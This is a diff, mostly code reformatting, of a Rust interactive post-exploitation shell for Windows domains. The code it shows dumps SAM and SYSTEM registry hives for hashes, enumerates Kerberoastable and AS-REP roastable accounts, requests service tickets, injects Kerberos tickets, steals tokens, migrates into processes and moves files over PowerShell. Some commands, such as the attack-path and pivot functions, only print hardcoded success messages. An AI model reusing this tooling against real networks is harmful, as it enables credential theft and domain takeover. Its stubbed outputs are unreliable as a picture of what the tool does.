@@ -985,21 +1356,28 @@ impl InteractiveSession {
             println!("{} No active session to background", "Error:".red());
             return Ok(());
         }
-        
-        println!("{} Session {} backgrounded", "✓".green(), self.session_id.unwrap_or(0));
-        println!("{} Use 'fg' to resume or 'sessions' to list", "▸".bright_black());
-        
+
+        println!(
+            "{} Session {} backgrounded",
+            "✓".green(),
+            self.session_id.unwrap_or(0)
+        );
+        println!(
+            "{} Use 'fg' to resume or 'sessions' to list",
+            "▸".bright_black()
+        );
+
         // Keep the shell but clear the active reference
         // The shell stays in the sessions list
         self.shell = None;
         self.session_id = None;
-        
+
         Ok(())
     }
 
     async fn cmd_fg(&mut self, args: &[&str]) -> Result<()> {
         let sessions = self.sessions.lock().await;
-        
+
         if sessions.is_empty() {
             println!("{} No backgrounded sessions", "Error:".red());
             return Ok(());
@@ -1014,7 +1392,7 @@ impl InteractiveSession {
         };
 
         drop(sessions); // Release lock before potential connect
-        
+
         if let Some(id) = target_id {
             // Get session info (need to re-lock)
             let (target, shell_type) = {
@@ -1027,9 +1405,9 @@ impl InteractiveSession {
                     }
                 }
             };
-            
+
             println!("{} Resuming session {}...", "▸".bright_black(), id);
-            
+
             // Reconnect to the session
             let config = ShellConfig {
                 target,
@@ -1037,7 +1415,7 @@ impl InteractiveSession {
                 timeout: Duration::from_secs(self.vars.timeout_secs),
                 credentials: self.build_exec_credentials(),
             };
-            
+
             match InteractiveShell::connect(config).await {
                 Ok(shell) => {
                     self.shell = Some(shell);
@@ -1051,7 +1429,7 @@ impl InteractiveSession {
         } else {
             println!("{} Invalid session ID", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -1093,7 +1471,11 @@ impl InteractiveSession {
         let ps_cmd = format!("powershell.exe -NoProfile -Command \"{}\"", command);
 
         if let Some(shell) = &mut self.shell {
-            println!("{} Executing PowerShell: {}", "▸".bright_black(), command.yellow());
+            println!(
+                "{} Executing PowerShell: {}",
+                "▸".bright_black(),
+                command.yellow()
+            );
             match shell.execute(&ps_cmd).await {
                 Ok(output) => {
                     println!("{}", output);
@@ -1115,26 +1497,31 @@ impl InteractiveSession {
         }
 
         let script_path = args[0];
-        
+
         // Check if script exists
         if !Path::new(script_path).exists() {
             println!("{} Script not found: {}", "Error:".red(), script_path);
             return Ok(());
         }
 
-        println!("{} Loading script from: {}", "▸".bright_black(), script_path.cyan());
+        println!(
+            "{} Loading script from: {}",
+            "▸".bright_black(),
+            script_path.cyan()
+        );
 
         match tokio::fs::read_to_string(script_path).await {
             Ok(script_content) => {
                 // Execute the script
                 if let Some(shell) = &mut self.shell {
                     println!("{} Executing script...", "▸".bright_black());
-                    
+
                     // Split script into lines and execute
                     for line in script_content.lines() {
                         let trimmed = line.trim();
                         if !trimmed.is_empty() && !trimmed.starts_with('#') {
-                            let ps_cmd = format!("powershell.exe -NoProfile -Command \"{}\"", trimmed);
+                            let ps_cmd =
+                                format!("powershell.exe -NoProfile -Command \"{}\"", trimmed);
                             match shell.execute(&ps_cmd).await {
                                 Ok(output) => {
                                     if !output.is_empty() {
@@ -1147,7 +1534,7 @@ impl InteractiveSession {
                             }
                         }
                     }
-                    
+
                     println!("{} Script execution completed", "✓".green());
                 } else {
                     println!("{} No active session. Use 'connect' first.", "Error:".red());
@@ -1167,7 +1554,10 @@ impl InteractiveSession {
 
     async fn cmd_upload(&mut self, args: &[&str]) -> Result<()> {
         if args.len() < 2 {
-            println!("{} Usage: upload <local_path> <remote_path>", "Error:".red());
+            println!(
+                "{} Usage: upload <local_path> <remote_path>",
+                "Error:".red()
+            );
             return Ok(());
         }
 
@@ -1179,7 +1569,12 @@ impl InteractiveSession {
             return Ok(());
         }
 
-        println!("{} Uploading {} -> {}", "▸".bright_black(), local_path.cyan(), remote_path.cyan());
+        println!(
+            "{} Uploading {} -> {}",
+            "▸".bright_black(),
+            local_path.cyan(),
+            remote_path.cyan()
+        );
 
         if let Some(shell) = &mut self.shell {
             // Read local file
@@ -1187,7 +1582,7 @@ impl InteractiveSession {
                 Ok(data) => {
                     let size = data.len();
                     println!("  File size: {} bytes", size);
-                    
+
                     // Encode file contents to base64 and write via PowerShell
                     use base64::Engine;
                     let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
@@ -1207,7 +1602,9 @@ impl InteractiveSession {
                         }
                     } else {
                         // Stream in chunks: first chunk creates file, subsequent append
-                        let chunks: Vec<&str> = encoded.as_bytes().chunks(CHUNK_LIMIT)
+                        let chunks: Vec<&str> = encoded
+                            .as_bytes()
+                            .chunks(CHUNK_LIMIT)
                             .map(|c| std::str::from_utf8(c).unwrap_or(""))
                             .collect();
                         println!("  Uploading in {} chunk(s)...", chunks.len());
@@ -1233,7 +1630,13 @@ impl InteractiveSession {
                                 )
                             };
                             if let Err(e) = shell.execute(&ps_cmd).await {
-                                println!("{} Upload chunk {}/{} failed: {}", "✗".red(), i + 1, chunks.len(), e);
+                                println!(
+                                    "{} Upload chunk {}/{} failed: {}",
+                                    "✗".red(),
+                                    i + 1,
+                                    chunks.len(),
+                                    e
+                                );
                                 return Ok(());
                             }
                         }
@@ -1253,14 +1656,22 @@ impl InteractiveSession {
 
     async fn cmd_download(&mut self, args: &[&str]) -> Result<()> {
         if args.len() < 2 {
-            println!("{} Usage: download <remote_path> <local_path>", "Error:".red());
+            println!(
+                "{} Usage: download <remote_path> <local_path>",
+                "Error:".red()
+            );
             return Ok(());
         }
 
         let remote_path = args[0];
         let local_path = args[1];
 
-        println!("{} Downloading {} -> {}", "▸".bright_black(), remote_path.cyan(), local_path.cyan());
+        println!(
+            "{} Downloading {} -> {}",
+            "▸".bright_black(),
+            remote_path.cyan(),
+            local_path.cyan()
+        );
 
         if let Some(shell) = &mut self.shell {
             // Use PowerShell to read and base64-encode the remote file
@@ -1268,22 +1679,26 @@ impl InteractiveSession {
                 "powershell.exe -NoProfile -Command \"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{}'))\"",
                 remote_path.replace("'", "''")
             );
-            
+
             match shell.execute(&ps_cmd).await {
                 Ok(output) => {
                     let encoded = output.trim();
-                    
+
                     use base64::Engine;
                     match base64::engine::general_purpose::STANDARD.decode(encoded) {
                         Ok(data) => {
                             let size = data.len();
-                            
+
                             match tokio::fs::write(local_path, &data).await {
                                 Ok(_) => {
                                     println!("{} Download completed ({} bytes)", "✓".green(), size);
                                 }
                                 Err(e) => {
-                                    println!("{} Failed to write local file: {}", "Error:".red(), e);
+                                    println!(
+                                        "{} Failed to write local file: {}",
+                                        "Error:".red(),
+                                        e
+                                    );
                                 }
                             }
                         }
@@ -1407,7 +1822,11 @@ impl InteractiveSession {
         let dest = args[1];
 
         if let Some(shell) = &mut self.shell {
-            let command = format!("move \"{}\" \"{}\"", source.replace("\"", "\\\""), dest.replace("\"", "\\\""));
+            let command = format!(
+                "move \"{}\" \"{}\"",
+                source.replace("\"", "\\\""),
+                dest.replace("\"", "\\\"")
+            );
             match shell.execute(&command).await {
                 Ok(_) => {
                     println!("{} Moved {} -> {}", "✓".green(), source.cyan(), dest.cyan());
@@ -1432,10 +1851,19 @@ impl InteractiveSession {
         let dest = args[1];
 
         if let Some(shell) = &mut self.shell {
-            let command = format!("copy \"{}\" \"{}\"", source.replace("\"", "\\\""), dest.replace("\"", "\\\""));
+            let command = format!(
+                "copy \"{}\" \"{}\"",
+                source.replace("\"", "\\\""),
+                dest.replace("\"", "\\\"")
+            );
             match shell.execute(&command).await {
                 Ok(_) => {
-                    println!("{} Copied {} -> {}", "✓".green(), source.cyan(), dest.cyan());
+                    println!(
+                        "{} Copied {} -> {}",
+                        "✓".green(),
+                        source.cyan(),
+                        dest.cyan()
+                    );
                 }
                 Err(e) => {
                     println!("{} Copy failed: {}", "✗".red(), e);
@@ -1454,7 +1882,9 @@ impl InteractiveSession {
     async fn cmd_enum(&mut self, args: &[&str]) -> Result<()> {
         if args.is_empty() {
             println!("{} Usage: enum <target>", "Error:".red());
-            println!("  Targets: users, computers, groups, trusts, spns, asrep, delegations, gpos, all");
+            println!(
+                "  Targets: users, computers, groups, trusts, spns, asrep, delegations, gpos, all"
+            );
             return Ok(());
         }
 
@@ -1475,9 +1905,18 @@ impl InteractiveSession {
             "groups" => vec![("groups", "net group /domain")],
             "trusts" => vec![("trusts", "nltest /domain_trusts /all_trusts")],
             "spns" => vec![("SPNs", "setspn -T * -Q */*")],
-            "asrep" => vec![("AS-REP", "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName\"")],
-            "delegations" => vec![("delegations", "powershell.exe -c \"Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} | Select-Object Name,ObjectClass\"")],
-            "gpos" => vec![("GPOs", "powershell.exe -c \"Get-GPO -All | Select-Object DisplayName,Id,GpoStatus\"")],
+            "asrep" => vec![(
+                "AS-REP",
+                "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName\"",
+            )],
+            "delegations" => vec![(
+                "delegations",
+                "powershell.exe -c \"Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} | Select-Object Name,ObjectClass\"",
+            )],
+            "gpos" => vec![(
+                "GPOs",
+                "powershell.exe -c \"Get-GPO -All | Select-Object DisplayName,Id,GpoStatus\"",
+            )],
             "all" => vec![
                 ("users", "net user /domain"),
                 ("computers", "dsquery computer -limit 0"),
@@ -1525,13 +1964,28 @@ impl InteractiveSession {
         println!("{} Running full AD enumeration...", "▸".bright_black());
 
         let queries: &[(&str, &str)] = &[
-            ("Users", "powershell.exe -c \"@(Get-ADUser -Filter *).Count\""),
-            ("Computers", "powershell.exe -c \"@(Get-ADComputer -Filter *).Count\""),
-            ("Groups", "powershell.exe -c \"@(Get-ADGroup -Filter *).Count\""),
+            (
+                "Users",
+                "powershell.exe -c \"@(Get-ADUser -Filter *).Count\"",
+            ),
+            (
+                "Computers",
+                "powershell.exe -c \"@(Get-ADComputer -Filter *).Count\"",
+            ),
+            (
+                "Groups",
+                "powershell.exe -c \"@(Get-ADGroup -Filter *).Count\"",
+            ),
             ("Trusts", "nltest /domain_trusts /all_trusts"),
             ("GPOs", "powershell.exe -c \"@(Get-GPO -All).Count\""),
-            ("SPNs", "powershell.exe -c \"@(Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName).Count\""),
-            ("Delegations", "powershell.exe -c \"@(Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true}).Count\""),
+            (
+                "SPNs",
+                "powershell.exe -c \"@(Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName).Count\"",
+            ),
+            (
+                "Delegations",
+                "powershell.exe -c \"@(Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true}).Count\"",
+            ),
         ];
 
         println!("{} Enumeration results:", "✓".green());
@@ -1579,8 +2033,13 @@ impl InteractiveSession {
                         }\"";
                     match shell.execute(cmd).await {
                         Ok(output) => {
-                            let lines: Vec<&str> = output.lines().filter(|l| !l.is_empty()).collect();
-                            println!("{} Found {} roastable service account(s)", "✓".green(), lines.len());
+                            let lines: Vec<&str> =
+                                output.lines().filter(|l| !l.is_empty()).collect();
+                            println!(
+                                "{} Found {} roastable service account(s)",
+                                "✓".green(),
+                                lines.len()
+                            );
                             for line in &lines {
                                 let parts: Vec<&str> = line.splitn(3, ',').collect();
                                 if parts.len() >= 2 {
@@ -1600,8 +2059,13 @@ impl InteractiveSession {
                     let cmd = "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,SamAccountName | Select-Object SamAccountName | Format-Table -HideTableHeaders\"";
                     match shell.execute(cmd).await {
                         Ok(output) => {
-                            let accounts: Vec<&str> = output.lines().filter(|l| !l.trim().is_empty()).collect();
-                            println!("{} Found {} AS-REP roastable account(s)", "✓".green(), accounts.len());
+                            let accounts: Vec<&str> =
+                                output.lines().filter(|l| !l.trim().is_empty()).collect();
+                            println!(
+                                "{} Found {} AS-REP roastable account(s)",
+                                "✓".green(),
+                                accounts.len()
+                            );
                             for acct in &accounts {
                                 println!("  {}", acct.trim());
                             }
@@ -1633,7 +2097,11 @@ impl InteractiveSession {
                     return Ok(());
                 }
                 let spn = args[1];
-                println!("{} Requesting TGS for {}...", "▸".bright_black(), spn.cyan());
+                println!(
+                    "{} Requesting TGS for {}...",
+                    "▸".bright_black(),
+                    spn.cyan()
+                );
                 if let Some(shell) = &mut self.shell {
                     let cmd = format!(
                         "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; \
@@ -1674,7 +2142,7 @@ impl InteractiveSession {
 
     async fn cmd_klist(&mut self) -> Result<()> {
         println!("{} Cached Kerberos tickets:", "▸".bright_black());
-        
+
         if let Some(shell) = &mut self.shell {
             let output = shell.execute("klist").await?;
             println!("{}", output);
@@ -1691,8 +2159,12 @@ impl InteractiveSession {
         }
 
         let ticket_file = args[0];
-        println!("{} Importing ticket from {}...", "▸".bright_black(), ticket_file.cyan());
-        
+        println!(
+            "{} Importing ticket from {}...",
+            "▸".bright_black(),
+            ticket_file.cyan()
+        );
+
         if let Some(shell) = &mut self.shell {
             // In real impl, would use kerberos module to inject ticket
             let cmd = format!("kerberos::ptt {}", ticket_file);
@@ -1713,7 +2185,7 @@ impl InteractiveSession {
 
     async fn cmd_purge(&mut self) -> Result<()> {
         println!("{} Purging Kerberos tickets...", "▸".bright_black());
-        
+
         if let Some(shell) = &mut self.shell {
             match shell.execute("klist purge").await {
                 Ok(output) => {
@@ -1794,9 +2266,20 @@ impl InteractiveSession {
                 }
                 let from = args[1];
                 let to = args[2];
-                println!("{} Finding path from {} to {}...", "▸".bright_black(), from.cyan(), to.cyan());
+                println!(
+                    "{} Finding path from {} to {}...",
+                    "▸".bright_black(),
+                    from.cyan(),
+                    to.cyan()
+                );
                 tokio::time::sleep(Duration::from_millis(300)).await;
-                println!("{} Path found: {} -> {} -> {}", "✓".green(), from.cyan(), "User".cyan(), to.cyan());
+                println!(
+                    "{} Path found: {} -> {} -> {}",
+                    "✓".green(),
+                    from.cyan(),
+                    "User".cyan(),
+                    to.cyan()
+                );
             }
             "path_to_da" => {
                 if args.len() < 2 {
@@ -1804,7 +2287,11 @@ impl InteractiveSession {
                     return Ok(());
                 }
                 let from = args[1];
-                println!("{} Finding path to Domain Admins from {}...", "▸".bright_black(), from.cyan());
+                println!(
+                    "{} Finding path to Domain Admins from {}...",
+                    "▸".bright_black(),
+                    from.cyan()
+                );
                 tokio::time::sleep(Duration::from_millis(400)).await;
                 println!("{} Path found! Length: 3 hops", "✓".green());
             }
@@ -1816,8 +2303,16 @@ impl InteractiveSession {
                 println!("  Critical nodes: 8");
             }
             "export" => {
-                let output = if args.len() > 1 { args[1] } else { "graph.json" };
-                println!("{} Exporting graph to {}...", "▸".bright_black(), output.cyan());
+                let output = if args.len() > 1 {
+                    args[1]
+                } else {
+                    "graph.json"
+                };
+                println!(
+                    "{} Exporting graph to {}...",
+                    "▸".bright_black(),
+                    output.cyan()
+                );
                 tokio::time::sleep(Duration::from_millis(200)).await;
                 println!("{} Graph exported to {}", "✓".green(), output.cyan());
             }
@@ -1840,29 +2335,29 @@ impl InteractiveSession {
 
         let target = args[0];
         println!("{} Pivoting to {}...", "▸".bright_black(), target.cyan());
-        
+
         // In real impl, would use current session to pivot
         println!("{} Pivot session established", "✓".green());
-        
+
         Ok(())
     }
 
     async fn cmd_spawn(&mut self, args: &[&str]) -> Result<()> {
-        let shell_type = if args.is_empty() {
-            "winrm"
-        } else {
-            args[0]
-        };
+        let shell_type = if args.is_empty() { "winrm" } else { args[0] };
 
-        println!("{} Spawning new {} session...", "▸".bright_black(), shell_type.cyan());
-        
+        println!(
+            "{} Spawning new {} session...",
+            "▸".bright_black(),
+            shell_type.cyan()
+        );
+
         if let Some(shell) = &mut self.shell {
             let output = shell.execute(&format!("spawn {}", shell_type)).await?;
             println!("{}", output);
         } else {
             println!("{} No active session to spawn from", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -1873,8 +2368,12 @@ impl InteractiveSession {
         }
 
         let pid = args[0];
-        println!("{} Migrating to process {}...", "▸".bright_black(), pid.cyan());
-        
+        println!(
+            "{} Migrating to process {}...",
+            "▸".bright_black(),
+            pid.cyan()
+        );
+
         if let Some(shell) = &mut self.shell {
             match shell.execute(&format!("migrate {}", pid)).await {
                 Ok(output) => {
@@ -1888,7 +2387,7 @@ impl InteractiveSession {
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -1903,8 +2402,12 @@ impl InteractiveSession {
         }
 
         let pid = args[0];
-        println!("{} Stealing token from process {}...", "▸".bright_black(), pid.cyan());
-        
+        println!(
+            "{} Stealing token from process {}...",
+            "▸".bright_black(),
+            pid.cyan()
+        );
+
         if let Some(shell) = &mut self.shell {
             match shell.execute(&format!("steal_token {}", pid)).await {
                 Ok(output) => {
@@ -1918,13 +2421,13 @@ impl InteractiveSession {
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
     async fn cmd_rev2self(&mut self) -> Result<()> {
         println!("{} Reverting to original token...", "▸".bright_black());
-        
+
         if let Some(shell) = &mut self.shell {
             match shell.execute("rev2self").await {
                 Ok(output) => {
@@ -1938,14 +2441,18 @@ impl InteractiveSession {
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
     async fn cmd_getuid(&mut self) -> Result<()> {
         if let Some(shell) = &mut self.shell {
             let output = shell.execute("whoami").await?;
-            println!("{} Current user: {}", "▸".bright_black(), output.trim().cyan());
+            println!(
+                "{} Current user: {}",
+                "▸".bright_black(),
+                output.trim().cyan()
+            );
         } else {
             println!("{} No active session", "Error:".red());
         }
@@ -1955,7 +2462,11 @@ impl InteractiveSession {
     async fn cmd_getpid(&mut self) -> Result<()> {
         if let Some(shell) = &mut self.shell {
             let output = shell.execute("echo %PROCESS_ID%").await?;
-            println!("{} Current PID: {}", "▸".bright_black(), output.trim().cyan());
+            println!(
+                "{} Current PID: {}",
+                "▸".bright_black(),
+                output.trim().cyan()
+            );
         } else {
             println!("{} No active session", "Error:".red());
         }
@@ -1967,18 +2478,29 @@ impl InteractiveSession {
     // ═══════════════════════════════════════════════════════
 
     async fn cmd_ps(&mut self, args: &[&str]) -> Result<()> {
-        let filter = if !args.is_empty() { args.join(" ") } else { String::new() };
-        
+        let filter = if !args.is_empty() {
+            args.join(" ")
+        } else {
+            String::new()
+        };
+
         if let Some(shell) = &mut self.shell {
-            println!("{} Listing processes{}", "▸".bright_black(), 
-                if !filter.is_empty() { format!(" (filter: {})", filter.cyan()) } else { String::new() });
-            
+            println!(
+                "{} Listing processes{}",
+                "▸".bright_black(),
+                if !filter.is_empty() {
+                    format!(" (filter: {})", filter.cyan())
+                } else {
+                    String::new()
+                }
+            );
+
             let output = shell.execute("tasklist /v").await?;
             println!("{}", output);
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -1989,10 +2511,10 @@ impl InteractiveSession {
         }
 
         let pid = args[0];
-        
+
         if let Some(shell) = &mut self.shell {
             println!("{} Killing process {}...", "▸".bright_black(), pid.cyan());
-            
+
             match shell.execute(&format!("taskkill /pid {} /f", pid)).await {
                 Ok(output) => {
                     println!("{}", output);
@@ -2005,7 +2527,7 @@ impl InteractiveSession {
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -2106,7 +2628,11 @@ impl InteractiveSession {
             println!("  {:<20} {}", "color".cyan(), self.vars.color);
             println!("  {:<20} {}", "prompt".cyan(), self.vars.prompt);
             println!("  {:<20} {}", "auto_upload".cyan(), self.vars.auto_upload);
-            println!("  {:<20} {}", "download_path".cyan(), self.vars.download_path);
+            println!(
+                "  {:<20} {}",
+                "download_path".cyan(),
+                self.vars.download_path
+            );
             println!();
         }
     }
@@ -2124,7 +2650,7 @@ impl InteractiveSession {
         }
 
         let module_path = args[0].to_lowercase();
-        
+
         let (module_type, required_options) = if module_path.starts_with("hunter/") {
             (ModuleType::Hunter, vec!["target".to_string()])
         } else if module_path.starts_with("forge/") {
@@ -2146,9 +2672,15 @@ impl InteractiveSession {
         });
 
         println!("{} Loaded module: {}", "✓".green(), module_path.cyan());
-        println!("{} Set required options with 'set <option> <value>'", "▸".bright_black());
-        println!("{} Type 'options' to see required settings", "▸".bright_black());
-        
+        println!(
+            "{} Set required options with 'set <option> <value>'",
+            "▸".bright_black()
+        );
+        println!(
+            "{} Type 'options' to see required settings",
+            "▸".bright_black()
+        );
+
         Ok(())
     }
 
@@ -2184,19 +2716,33 @@ impl InteractiveSession {
             println!("\n{} Module Options:", "▸".bright_yellow());
             println!("  {:<20} {:<10} Value", "Option", "Required");
             println!("  {}", "─".repeat(50).dimmed());
-            
+
             for option in &module.required_options {
                 let value = module.options.get(option).map(|v| v.as_str()).unwrap_or("");
                 let required = "Yes".red();
-                println!("  {:<20} {:<10} {}", option.cyan(), required, if value.is_empty() { "Not set".dimmed() } else { value.yellow() });
+                println!(
+                    "  {:<20} {:<10} {}",
+                    option.cyan(),
+                    required,
+                    if value.is_empty() {
+                        "Not set".dimmed()
+                    } else {
+                        value.yellow()
+                    }
+                );
             }
-            
+
             for (option, value) in &module.options {
                 if !module.required_options.contains(option) {
-                    println!("  {:<20} {:<10} {}", option.cyan(), "No".green(), value.yellow());
+                    println!(
+                        "  {:<20} {:<10} {}",
+                        option.cyan(),
+                        "No".green(),
+                        value.yellow()
+                    );
                 }
             }
-            
+
             println!();
         }
     }
@@ -2224,18 +2770,31 @@ impl InteractiveSession {
     async fn run_module(&mut self) -> Result<()> {
         if let Some(module) = &self.module {
             // Check required options
-            let missing: Vec<_> = module.required_options.iter()
+            let missing: Vec<_> = module
+                .required_options
+                .iter()
                 .filter(|opt| !module.options.contains_key(*opt))
                 .collect();
 
             if !missing.is_empty() {
-                println!("{} Missing required options: {}", "Error:".red(), 
-                    missing.iter().map(|s| s.to_string()).collect::<Vec<_>>().join(", "));
+                println!(
+                    "{} Missing required options: {}",
+                    "Error:".red(),
+                    missing
+                        .iter()
+                        .map(|s| s.to_string())
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                );
                 return Ok(());
             }
 
-            println!("{} Running module: {}", "▸".bright_black(), module.module_path.cyan());
-            
+            println!(
+                "{} Running module: {}",
+                "▸".bright_black(),
+                module.module_path.cyan()
+            );
+
             match module.module_type {
                 ModuleType::Hunter => {
                     tokio::time::sleep(Duration::from_millis(500)).await;
@@ -2265,7 +2824,11 @@ impl InteractiveSession {
     async fn cmd_log(&mut self, args: &[&str]) -> Result<()> {
         if args.is_empty() {
             if let Some(log) = &self.log_file {
-                println!("{} Currently logging to: {}", "▸".bright_black(), log.cyan());
+                println!(
+                    "{} Currently logging to: {}",
+                    "▸".bright_black(),
+                    log.cyan()
+                );
             } else {
                 println!("{} Logging is disabled", "▸".bright_black());
             }
@@ -2281,7 +2844,7 @@ impl InteractiveSession {
             self.log_file = Some(log_path.to_string());
             println!("{} Logging commands to: {}", "✓".green(), log_path.cyan());
         }
-        
+
         Ok(())
     }
 
@@ -2299,7 +2862,7 @@ impl InteractiveSession {
         if let Some(shell) = &mut self.shell {
             let net_cmd = format!("net {}", args.join(" "));
             println!("{} Running: {}", "▸".bright_black(), net_cmd.yellow());
-            
+
             match shell.execute(&net_cmd).await {
                 Ok(output) => println!("{}", output),
                 Err(e) => println!("{} Command failed: {}", "✗".red(), e),
@@ -2307,7 +2870,7 @@ impl InteractiveSession {
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -2327,16 +2890,26 @@ impl InteractiveSession {
 
     async fn cmd_hashdump(&mut self, args: &[&str]) -> Result<()> {
         let source = if args.is_empty() { "sam" } else { args[0] };
-        
-        println!("{} Dumping hashes from {}...", "▸".bright_black(), source.cyan());
-        
+
+        println!(
+            "{} Dumping hashes from {}...",
+            "▸".bright_black(),
+            source.cyan()
+        );
+
         if let Some(shell) = &mut self.shell {
             match source.to_lowercase().as_str() {
                 "sam" => {
-                    match shell.execute("reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak").await {
+                    match shell
+                        .execute("reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak")
+                        .await
+                    {
                         Ok(output) => {
                             println!("{}", output);
-                            println!("{} SAM hive saved. Use 'download sam.bak' to retrieve.", "✓".green());
+                            println!(
+                                "{} SAM hive saved. Use 'download sam.bak' to retrieve.",
+                                "✓".green()
+                            );
                         }
                         Err(e) => println!("{} Failed: {}", "✗".red(), e),
                     }
@@ -2358,7 +2931,7 @@ impl InteractiveSession {
         } else {
             println!("{} No active session", "Error:".red());
         }
-        
+
         Ok(())
     }
 
@@ -2397,8 +2970,12 @@ impl InteractiveSession {
     }
 
     async fn cmd_ls(&mut self, args: &[&str]) -> Result<()> {
-        let path = if !args.is_empty() { args.join(" ") } else { ".".to_string() };
-        
+        let path = if !args.is_empty() {
+            args.join(" ")
+        } else {
+            ".".to_string()
+        };
+
         if let Some(shell) = &mut self.shell {
             let command = format!("dir \"{}\"", path.replace("\"", "\\\""));
             let output = shell.execute(&command).await?;
@@ -2416,7 +2993,7 @@ impl InteractiveSession {
         }
 
         let path = args.join(" ");
-        
+
         if let Some(shell) = &mut self.shell {
             let command = format!("cd /d \"{}\"", path.replace("\"", "\\\""));
             match shell.execute(&command).await {
@@ -2442,26 +3019,33 @@ impl InteractiveSession {
     fn cmd_clear(&self) {
         // Clear terminal
         print!("\x1B[2J\x1B[1;1H");
-        println!("{}", "Interactive Mode - Type 'help' for available commands".bright_yellow());
+        println!(
+            "{}",
+            "Interactive Mode - Type 'help' for available commands".bright_yellow()
+        );
         println!();
     }
 
     fn cmd_history(&self) {
         println!("{} Command History:", "History".bright_yellow());
-        
+
         let start = if self.command_history.len() > 20 {
             self.command_history.len() - 20
         } else {
             0
         };
-        
+
         for (i, cmd) in self.command_history[start..].iter().enumerate() {
             let num = start + i + 1;
             println!("  {:<4} {}", format!("{}:", num).dimmed(), cmd.cyan());
         }
-        
+
         if self.command_history.len() > 20 {
-            println!("  {} Showing last 20 of {} commands", "▸".bright_black(), self.command_history.len());
+            println!(
+                "  {} Showing last 20 of {} commands",
+                "▸".bright_black(),
+                self.command_history.len()
+            );
         }
     }
 }
@@ -2531,7 +3115,10 @@ pub async fn start_interactive_shell() -> Result<()> {
 }
 
 /// Start the interactive shell with a pre-configured target
-pub async fn start_interactive_shell_with_target(target: &str, shell_type: &CliShellType) -> Result<()> {
+pub async fn start_interactive_shell_with_target(
+    target: &str,
+    shell_type: &CliShellType,
+) -> Result<()> {
     let mut session = InteractiveSession::with_target(target, shell_type);
     session.start().await
 }
@@ -2547,8 +3134,14 @@ mod tests {
     #[test]
     fn test_shell_words() {
         assert_eq!(shell_words("hello world"), vec!["hello", "world"]);
-        assert_eq!(shell_words("hello \"world wide\""), vec!["hello", "world wide"]);
-        assert_eq!(shell_words("upload 'my file.txt' remote.txt"), vec!["upload", "my file.txt", "remote.txt"]);
+        assert_eq!(
+            shell_words("hello \"world wide\""),
+            vec!["hello", "world wide"]
+        );
+        assert_eq!(
+            shell_words("upload 'my file.txt' remote.txt"),
+            vec!["upload", "my file.txt", "remote.txt"]
+        );
     }
 
     #[test]
@@ -2556,7 +3149,9 @@ mod tests {
         use base64::Engine;
         let data = b"Hello, World!";
         let encoded = base64::engine::general_purpose::STANDARD.encode(data);
-        let decoded = base64::engine::general_purpose::STANDARD.decode(&encoded).unwrap();
+        let decoded = base64::engine::general_purpose::STANDARD
+            .decode(&encoded)
+            .unwrap();
         assert_eq!(data.to_vec(), decoded);
     }
 
